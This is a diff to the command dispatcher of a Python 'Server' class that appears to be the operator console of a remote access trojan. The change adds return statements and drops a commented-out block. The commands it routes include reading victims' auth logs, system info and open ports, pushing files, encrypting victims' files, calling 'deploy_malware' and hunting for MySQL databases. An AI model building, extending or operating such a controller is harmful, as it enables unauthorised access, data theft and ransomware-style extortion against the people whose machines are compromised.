@@ -42,46 +42,52 @@ class Server:
         if command == "get_location":
             depens.display_clients(self)
             command = None
-
+            return
+        
         if command == "get_open_ports":
             depens.get_open_ports(self)
             command = None
-
+            return 
+    
         if command == "get_auth_log":
             depens.get_auth_log(self)
             command = None
-
+            return
+    
         if command == "get_sysinfo":
             depens.sysinfo(self)
             command = None
-
+            return
+    
         if command == "put_file":
             file = input("File: ")
             depens.put_file(self, file)
             command = None
+            return
+    
         if command == "encrypt_file":
             file = input("File: ")
             depens.get_file_then_encrpyt(self, file)
             command = None
+            return
         
         if command == "get_service":
             depens.Get_service(self)
             depens.deploy_malware(self)
             command = None
+            return 
         
         if command == "refresh":
             # use refresh_connection to refresh the connection
             depens.refresh_connection(self)
             command = None
-
+            return 
+    
         if command == "find_sql":
             depens.search_for_mysql_database(self)
             command = None
-
-        # if command == "update_service":
-        #     depens.rewrite_service_init()
-        #     print("Service Updated")            
-
+            return 
+    
         if command == "clear":
             os.system('cls' if os.name == 'nt' else 'clear')
             depens.welcome(self, ALLOWED_AMOUNT_OF_CONNECTIONS)
@@ -119,7 +125,7 @@ class Server:
             self.close_conn()
             command = None
             
-        if command == "":
+        if command == None:
             print("You chose nothing")
             self.command_clients()
             command = None
